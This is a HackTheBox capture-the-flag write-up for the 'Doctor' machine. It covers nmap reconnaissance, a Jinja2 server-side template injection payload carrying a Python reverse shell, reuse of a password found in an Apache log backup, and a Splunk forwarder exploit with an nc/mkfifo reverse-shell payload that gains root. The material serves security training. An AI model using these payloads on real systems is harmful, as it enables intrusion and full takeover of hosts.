---
title: "HackTheBox — Doctor Writeup"
date: 2020-10-15 10:50:00 +0530
categories: [Hackthbox,Machine,Linux]
tags: [Server Side Template Injection, Splunk,CVE-2020-9484]
image: /images/doctor/icon.png
---
> Doctor from HackTheBox is an easy linux machine. We'll start with basic enumeration with nmap as usual.

## Reconnaissance

Let's begin with `nmap` to discover open ports and services:

```shell
nmap -sC -sV 10.10.10.209 -on=nmap.txt
# Nmap 7.80 scan initiated Sat Oct 17 13:33:03 2020 as: nmap -sC -sV -oN=nmap.txt 10.10.10.209
Nmap scan report for 10.10.10.209
Host is up (0.30s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Doctor
8089/tcp open  ssl/http Splunkd httpd
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Splunkd
|_http-title: splunkd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2020-09-06T15:57:27
|_Not valid after:  2023-09-06T15:57:27
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Oct 17 13:34:16 2020 -- 1 IP address (1 host up) scanned in 73.30 seconds

```
Based on the scan results we can port see `22,80 and 8089` are open, so lets check 80 first.

## HTTP - Port 80

Looking at https://10.10.10.209 we found the `info@doctors.htb`.

`home page`
![website](/images/doctor/1website.png)

![info](/images/doctor/2info.png)

let's add this domain to `/etc/hosts` , `10.10.10.209 doctors.htb`.
and lets check what is it `http://doctors.htb`.

![login](/images/doctor/3login.png)

we get a login page.lets create a new user and get inside .

![register](/images/doctor/4registerandogin.png)

![index](/images/doctor/5doctorindex.png)

check the source code of page `ctrl+u` , we found the commented arhive herf.
lets visit this page.

![index](/images/doctor/5archive_blank.png)

this is a blank page with only title if we check the source code of page.
![index](/images/doctor/6archive.png)


from wappayzer we find its using flask with python3
![index](/images/doctor/wappalyzer.png)


lets create a new message.

![index](/images/doctor/8testpost.png)

upon refreshing the archive page and viewing the code .

![index](/images/doctor/testarchive.png)



### SSTI (server-side template injection)

lets first test for server-side template injection.
  [**Here**](https://portswigger.net/web-security/server-side-template-injection) is the detailed explanation of  `SSIT`.


![index](/images/doctor/9testpost.png)

we can verify `SSIT` by refreshing archive source page.
![brup](/images/doctor/10ssti_archive.png)


### Shell

we verify that this site is vunerable to `SSIT`.
now lets use this vun for getting shell.
for that we know there is python runing on the machine
lets use python script for reverse shell.

```shell
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"IP_ADDRESS\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
```
repace IP_address and create a new message. and listen with `nc -nlvp 4444`.

![brup](/images/doctor/shellpost.png)


upon refreshing archve page,  we get the shell.

```shell
┌─[oxy@oxy]─[~/Practice/hackthebox/machine/doctor]
└──╼ $nc -nlvp 4444
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.10.209.
Ncat: Connection from 10.10.10.209:36254.
ls
blog
blog.sh
whoami
web
python3 -c 'import pty; pty.spawn("/bin/bash")'
web@doctor:~$ 
```



## User

### Enumeration

lets enum for user
lets check the apache folder first.

```shell
web@doctor:/var/log/apache2$ ls
access.log        access.log.5.gz  error.log.10.gz  error.log.5.gz
access.log.1      access.log.6.gz  error.log.11.gz  error.log.6.gz
access.log.10.gz  access.log.7.gz  error.log.12.gz  error.log.7.gz
access.log.11.gz  access.log.8.gz  error.log.13.gz  error.log.8.gz
access.log.12.gz  access.log.9.gz  error.log.14.gz  error.log.9.gz
access.log.2.gz   backup           error.log.2.gz   other_vhosts_access.log
access.log.3.gz   error.log        error.log.3.gz
access.log.4.gz   error.log.1      error.log.4.gz
```
we got a backup file , lets check for any credintialsit have.

```shell
web@doctor:/var/log/apache2$ cat backup | grep password
cat backup | grep password
10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"
```

got a password `Guitar123`.

lets check this password if it gives us any user access.
we got the user shaun on home directory so lets check for shaun

```shell
web@doctor:/home$ su shaun
Password: Guitar123
shaun@doctor:/home$ ls
shaun  web
shaun@doctor:/home$ cd shaun
shaun@doctor:~$ ls
user.txt 
```

we got a user. 


## Elevating privilige: shaun -> root

### Enumeration

going back to nmap scan

```shell
8089/tcp open  ssl/http Splunkd httpd
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Splunkd
|_http-title: splunkd
```

we see the machine is running Splunk on port `8089`.
lets check `/opt` folder

```shell
shaun@doctor:~$ cd /opt
shaun@doctor:/opt$ ls
clean  splunkforwarder
```

and we have an expoit for splunkforwarder.
[[**Here**]](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2) is the link of the exploit. download and fire it and 
listen with netcat.
at this exploit requires python2 and other modules we are using remote exploit.


### Exploit

`command for exploit`

```shell
python3 exploit.py --host doctors.htb --port 8089 --lhost 10.10.14.38 --username shaun --password Guitar123 --payload 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.38 4445 >/tmp/f' 
```



```shell
┌─[oxy@oxy]─[~/Practice/hackthebox/machine/doctor]
└──╼ $python3 exploit.py --host doctors.htb --port 8089 --lhost 10.10.14.38 --username shaun --password Guitar123 --payload 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.38 4445 >/tmp/f'
Running in remote mode (Remote Code Execution)
[.] Authenticating...
[+] Authenticated
[.] Creating malicious app bundle...
[+] Created malicious app bundle in: /tmp/tmp0us4b5f0.tar
[+] Started HTTP server for remote mode
[.] Installing app from: http://10.10.14.38:8181/
10.10.10.209 - - [21/Oct/2020 13:12:47] "GET / HTTP/1.1" 200 -
[+] App installed, your code should be running now!

Press RETURN to cleanup
```

```shell
┌─[✗]─[oxy@oxy]─[~/Practice/hackthebox/machine/doctor]
└──╼ $nc -nlvp 4445
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::4445
Ncat: Listening on 0.0.0.0:4445
Ncat: Connection from 10.10.10.209.
Ncat: Connection from 10.10.10.209:60706.
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# cd /root
# ls
root.txt
```


And we pwned the Box !

Thanks for reading.
